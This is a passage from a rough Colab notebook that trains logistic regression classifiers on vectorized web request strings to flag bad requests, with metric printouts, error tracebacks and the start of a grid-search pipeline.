            "\u001b[0;32m<ipython-input-62-c0ad1f130f06>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mm\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mLogisticRegression\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mC\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m1e8\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m \u001b[0mm\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtrn_term_doc1\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my_train\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, sample_weight)\u001b[0m\n\u001b[1;32m   1525\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1526\u001b[0m         X, y = check_X_y(X, y, accept_sparse='csr', dtype=_dtype, order=\"C\",\n\u001b[0;32m-> 1527\u001b[0;31m                          accept_large_sparse=solver != 'liblinear')\n\u001b[0m\u001b[1;32m   1528\u001b[0m         \u001b[0mcheck_classification_targets\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1529\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclasses_\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mnp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0munique\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/utils/validation.py\u001b[0m in \u001b[0;36mcheck_X_y\u001b[0;34m(X, y, accept_sparse, accept_large_sparse, dtype, order, copy, force_all_finite, ensure_2d, allow_nd, multi_output, ensure_min_samples, ensure_min_features, y_numeric, warn_on_dtype, estimator)\u001b[0m\n\u001b[1;32m    763\u001b[0m         \u001b[0my\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mastype\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfloat64\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    764\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 765\u001b[0;31m     \u001b[0mcheck_consistent_length\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    766\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    767\u001b[0m     \u001b[0;32mreturn\u001b[0m \u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/utils/validation.py\u001b[0m in \u001b[0;36mcheck_consistent_length\u001b[0;34m(*arrays)\u001b[0m\n\u001b[1;32m    210\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0muniques\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m>\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    211\u001b[0m         raise ValueError(\"Found input variables with inconsistent numbers of\"\n\u001b[0;32m--> 212\u001b[0;31m                          \" samples: %r\" % [int(l) for l in lengths])\n\u001b[0m\u001b[1;32m    213\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    214\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mValueError\u001b[0m: Found input variables with inconsistent numbers of samples: [24449, 39119]"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_zjX8Dy68K_"
      },
      "source": [
        "# 5 Evaluation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kQNugllw2YLp"
      },
      "source": [
        "## 5.1 tfidf vectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xN6EnjLCktcb"
      },
      "source": [
        "def print_score(m, _df, pred, x_test, y_test):\r\n",
        "  fpr, tpr, _ = metrics.roc_curve(y_test, (m.predict_proba(x_test)[:, 1]))\r\n",
        "  auc = metrics.auc(fpr, tpr)\r\n",
        "  # print(f\"All rows: {len(_df.IP)}, bad request count: {len(bad_requests)}\")\r\n",
        "  # print(\"Baseline Constant negative: %.6f\" % (len(_df.IP) / (len(_df.IP) + len(bad_requests))))\r\n",
        "  print(\"Accuracy: %f\" % m.score(x_test, y_test))  #checking the accuracy\r\n",
        "  print(\"Precision: %f\" % metrics.precision_score(y_test, pred))\r\n",
        "  print(\"Recall: %f\" % metrics.recall_score(y_test, pred))\r\n",
        "  print(\"F1-Score: %f\" % metrics.f1_score(y_test, pred))\r\n",
        "  print(\"AUC: %f\" % auc)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MeExFBTIlSev",
        "outputId": "dd303259-3a17-48ae-8fda-f59999ac4821"
      },
      "source": [
        "print_score(lgs, dft, predicted, X_test, y_test)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "All rows: 83230, bad request count: 7729\n",
            "Baseline Constant negative: 0.915028\n",
            "Accuracy: 0.993488\n",
            "Precision: 0.992875\n",
            "Recall: 1.000000\n",
            "F1-Score: 0.996425\n",
            "AUC: 0.999736\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Rgox5hmT2ciu"
      },
      "source": [
        "## 5.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "huJi8SLc2la_",
        "outputId": "e49fc7af-8620-4e54-b66f-7c53689a2e51"
      },
      "source": [
        "preds = m.predict(val_term_doc1)\r\n",
        "(preds==val_y).mean()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.5762923779754748"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 75
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Mht87EBdsxks"
      },
      "source": [
        "# 6 Pipeline"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pQ7lqObA3Uh7"
      },
      "source": [
        "## 6.1 Labeling"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZqZkWjuUI_wc"
      },
      "source": [
        "def set_label(df_l, bad_data):\r\n",
        "  bad_req = get_bad_requests(df_l, bad_data)\r\n",
        "  good_req = bad_req.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']\r\n",
        "  df_l['is_safe'] = df_l.request.isin(good_req.request).astype(bool)\r\n",
        "  return df_l, bad_req, good_req"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ecL5TzTuO9a_"
      },
      "source": [
        "dft, bad_requests, good_requests = set_label(dft, bad_words)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "42aPDja73YTp"
      },
      "source": [
        "## 6.2 Split and prepare"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8O1dHjteMGON"
      },
      "source": [
        "# analyzer 'word' or 'char'\r\n",
        "def get_vectorizers(analyzer, ngram=(1,3), max_features=40000):\r\n",
        "  t_veczr = TfidfVectorizer(ngram_range=ngram,\r\n",
        "                            min_df=0.0, \r\n",
        "                            analyzer=analyzer,\r\n",
        "                            max_features=max_features, \r\n",
        "                            sublinear_tf=True)\r\n",
        "  c_veczr = CountVectorizer(ngram_range=ngram,\r\n",
        "                            analyzer=analyzer, \r\n",
        "                            max_features=max_features)\r\n",
        "  return t_veczr, c_veczr"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YXaOteiMvYk9",
        "outputId": "30db6746-74c0-4875-c0cf-305013deaad5"
      },
      "source": [
        "dft.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(48899, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 36
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "pATd9816wlLy"
      },
      "source": [
        "x = dft['request'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gi-vbPkbj5vg"
      },
      "source": [
        "y = dft['is_safe'].to_list()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4kiBXacL3DfW",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8d9a7cce-f4e5-468d-9e39-7e11983b7c18"
      },
      "source": [
        "int(len(y) * 0.8)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "39119"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 40
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CuTA3F1wrUSL"
      },
      "source": [
        "# train, test, validation : 40% 30% 30%\r\n",
        "def split_lst(lst):\r\n",
        "  split_trn = int(len(lst) * 0.4)\r\n",
        "  trn_lst = lst[:split_trn]\r\n",
        "  tmp_lst = lst[split_trn:]\r\n",
        "  split_val = int(len(tmp_lst) / 2)\r\n",
        "  test_lst = tmp_lst[:split_val]\r\n",
        "  val_lst = tmp_lst[split_val:]\r\n",
        "  return trn_lst, test_lst, val_lst"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7K_XVaha3Mi9"
      },
      "source": [
        "# tfidf\r\n",
        "def split_val(l, split=0.7):\r\n",
        "  mid = int(len(y) * split)\r\n",
        "  t = l[:mid]\r\n",
        "  v = l[mid:]\r\n",
        "  return t, v"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Y1b-ITutvMxC"
      },
      "source": [
        "# parameter tuning\r\n",
        "trn_y, test_y, val_y = split_lst(y)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "IPsdTvR-eP8W"
      },
      "source": [
        "trn_y, test_y = split_val(y)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zRXXxjR63FTI",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "11e76161-e046-46b6-84c6-e368c5ed8de5"
      },
      "source": [
        "len(trn_y), len(test_y) #, len(val_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(34229, 14670)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "nqTYTlvjgSKo"
      },
      "source": [
        "# parameter tuning\r\n",
        "trn_x, test_x, val_x = split_lst(x)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "wUJDycIbeA4N"
      },
      "source": [
        "trn_x, test_x = split_val(x)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W2GJreoxgZxU",
        "outputId": "87ea9cf5-2e05-4578-f3f3-21ae9ae53bf8"
      },
      "source": [
        "len(trn_x), len(test_x) # , len(val_x)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(34229, 14670)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 45
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "VQm_5Zcsb8ul",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "03ba0e21-07b8-4c36-ccbd-417aaecdab47"
      },
      "source": [
        "y[0]"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "False"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 161
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Or0Q8stzavpK"
      },
      "source": [
        "t_trn_y, t_val_y = split_val(y)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "co_xOJWWZ8TB",
        "outputId": "433264a1-2db0-40d1-a9ac-a75507590519"
      },
      "source": [
        "len(t_trn_y), len(t_val_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(34229, 14670)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 47
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9o0skim3bRNW"
      },
      "source": [
        "t_trn_x, t_val_x = split_val(x)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6j_A603MMeVG"
      },
      "source": [
        "t_veczr, c_veczr = get_vectorizers('word')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yyPAGxKt3hcS",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "6136521c-d4ee-4c89-db37-25d1c55447e7"
      },
      "source": [
        "%time X = t_veczr.fit_transform(x)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 845 ms, sys: 374 µs, total: 846 ms\n",
            "Wall time: 848 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8iNdLyP8Xksy",
        "outputId": "79a43b99-977a-4c17-af65-4e1fc8ea173a"
      },
      "source": [
        "X[0]"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<1x23898 sparse matrix of type '<class 'numpy.float64'>'\n",
              "\twith 22 stored elements in Compressed Sparse Row format>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 51
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zWKoQ5kc3vDG"
      },
      "source": [
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "MYLVWxFa3ecg"
      },
      "source": [
        "## 6.3 models"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aF2BGXt63ntU"
      },
      "source": [
        "### 6.3.1 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "z5MV3Yp2371u"
      },
      "source": [
        "tf_m = LogisticRegression(\r\n",
        "    C=1e4, # C=0.1,\r\n",
        "    class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "seQb0TZ_4I1T",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f0de8d5e-9d0c-4c4b-b88f-170775dd65ab"
      },
      "source": [
        "%time tf_m.fit(X_train, y_train)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 1.52 s, sys: 2.2 s, total: 3.72 s\n",
            "Wall time: 1.9 s\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=10000.0, class_weight={0: 1.0, 1: 3.949507239323519},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 97
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wbjfbbyT4MpP"
      },
      "source": [
        "### 6.3.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YcXjHewd4Qah",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "00139a79-6115-4c0c-d5c4-bec7412b87d4"
      },
      "source": [
        "%%time\r\n",
        "trn_term_doc = c_veczr.fit_transform(trn_x)\r\n",
        "val_term_doc = c_veczr.transform(test_x)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 866 ms, sys: 0 ns, total: 866 ms\n",
            "Wall time: 868 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YcGj2HRkbT3P"
      },
      "source": [
        "Using regularization. Crossentropy =~ rmse. (For classification). youtube lesson 11 22:58"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9h3PMYaG4gbA"
      },
      "source": [
        "y1 = trn_y\r\n",
        "x1 = trn_term_doc.sign()\r\n",
        "c_test_x = val_term_doc.sign()\r\n",
        "p = x1[y1==1].sum(0)+1\r\n",
        "q = x1[y1==0].sum(0)+1\r\n",
        "r = np.log((p/p.sum())/(q/q.sum()))\r\n",
        "b = np.log(len(p)/len(q))"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KeqgE22w5uuv",
        "outputId": "84a760e5-cea8-4112-b682-c986816ddc57"
      },
      "source": [
        "c_m = LogisticRegression(C=1e4,\r\n",
        "                         class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})\r\n",
        "c_m.fit(x1, y1)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=10000.0, class_weight={0: 1.0, 1: 3.949507239323519},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 57
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kBdgk25mQbL0"
      },
      "source": [
        "Naive Biase with multiplication"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "b5DfWj_BzLxH"
      },
      "source": [
        "## 6.4 Evaluation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BQEEM9sazXui"
      },
      "source": [
        "### 6.4.1 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Y5dPalejzPAO"
      },
      "source": [
        "tf_preds = tf_m.predict(X_test)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NwtF0ZmLzhkc",
        "outputId": "45c51052-0ba0-4467-b3d8-341335af112f"
      },
      "source": [
        "print_score(tf_m, dft, tf_preds, X_test, y_test)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Accuracy: 0.997137\n",
            "Precision: 0.995882\n",
            "Recall: 0.999847\n",
            "F1-Score: 0.997860\n",
            "AUC: 0.999941\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ufoZ78IkxVBy",
        "outputId": "4ef9f333-7289-4b6e-a2a0-b6342c767b3f"
      },
      "source": [
        "# single prediction\r\n",
        "val_1 = t_veczr.transform(['robots.txt']) #val_x[109]\r\n",
        "tf_m.predict(val_1)\r\n",
        "# final_model.predict(val_1)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ True])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 80
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MqJUhlp_CQ6W"
      },
      "source": [
        "t_matrix = t_veczr.fit_transform(x)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ySMnQK2MkBQ7"
      },
      "source": [
        "### 6.4.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gaSv9bcJ53oV",
        "outputId": "dbdc58c7-7ab9-4122-cf36-7c17b3cdc1cc"
      },
      "source": [
        "c_preds = c_m.predict(val_term_doc)\r\n",
        "# (c_preds.T==test_y).mean()\r\n",
        "print_score(c_m, dft, c_preds, val_term_doc, test_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Accuracy: 0.998978\n",
            "Precision: 0.999224\n",
            "Recall: 0.999321\n",
            "F1-Score: 0.999273\n",
            "AUC: 0.999884\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_U-7J0cHZqYH",
        "outputId": "fd327df5-0e72-4129-9e56-033b546748d7"
      },
      "source": [
        "pr = c_veczr.transform(['robots.txt'])\r\n",
        "c_m.predict(pr)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ True])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 81
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VQeZjCoob1Um"
      },
      "source": [
        "Here we fit regularized logistic regression where the features are the trigrams log-count ratios. fastai youtube lesson 11 26:40"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vCq0u65B6Pjc",
        "outputId": "037999bb-42e4-4302-915a-d16c44ca53be"
      },
      "source": [
        "x_nb = x1.multiply(r)\r\n",
        "c_m.fit(x_nb, y1)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=10000.0, class_weight={0: 1.0, 1: 3.949507239323519},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 66
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NBOEo5ZnlAxH",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 333
        },
        "outputId": "aa96aef8-8c4c-4f3b-bfd7-319bd1bfb1fd"
      },
      "source": [
        "np.exp(x_nb)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "TypeError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/scipy/sparse/base.py\u001b[0m in \u001b[0;36m__getattr__\u001b[0;34m(self, attr)\u001b[0m\n\u001b[1;32m    690\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 691\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mAttributeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mattr\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m\" not found\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    692\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mAttributeError\u001b[0m: exp not found",
            "\nThe above exception was the direct cause of the following exception:\n",
            "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-67-a852da628d40>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mnp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mx_nb\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;31mTypeError\u001b[0m: loop of ufunc does not support argument 0 of type coo_matrix which has no callable exp method"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6cHUPfn77iiF",
        "outputId": "a3a6dda3-437e-437d-ae54-80101ff111c6"
      },
      "source": [
        "val_x_nb = c_test_x.multiply(r)\r\n",
        "c_preds2 = c_m.predict(val_x_nb)\r\n",
        "# (preds2.T==test_y).mean()\r\n",
        "print_score(c_m, dft, c_preds, val_term_doc, test_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "All rows: 48899, bad request count: 16438\n",
            "Baseline Constant negative: 0.748412\n",
            "Accuracy: 0.701431\n",
            "Precision: 0.998834\n",
            "Recall: 0.998980\n",
            "F1-Score: 0.998907\n",
            "AUC: 0.500000\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ZHt32AI1hrct"
      },
      "source": [
        "# 7 Grid search"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "E4y5E15uhwwX"
      },
      "source": [
        "## 7.1 Pipeline"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vaIBE9F4hzpT"
      },
      "source": [
        "pipeline = Pipeline([\r\n",
        "  ('tf_vect', TfidfVectorizer()),\r\n",
        "  ('c_vect', CountVectorizer()),\r\n",
        "  ('model', LogisticRegression()),\r\n",
        "])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "T4_gtWwHjIHF"
      },
      "source": [
        "parameters = {\r\n",
        "  'c_vect__max_df': (0.0,), #(0.5, 0.75),\r\n",
        "  'c_vect__max_features': (5000,), # 10000, 20000, 40000),\r\n",
        "  'tf_vect__analyzer': ('word',),\r\n",
        "  'c_vect__analyzer': ('word',),\r\n",
        "  'tf_vect__ngram_range': ((1, 3),), # (1, 4), (1, 5)),\r\n",
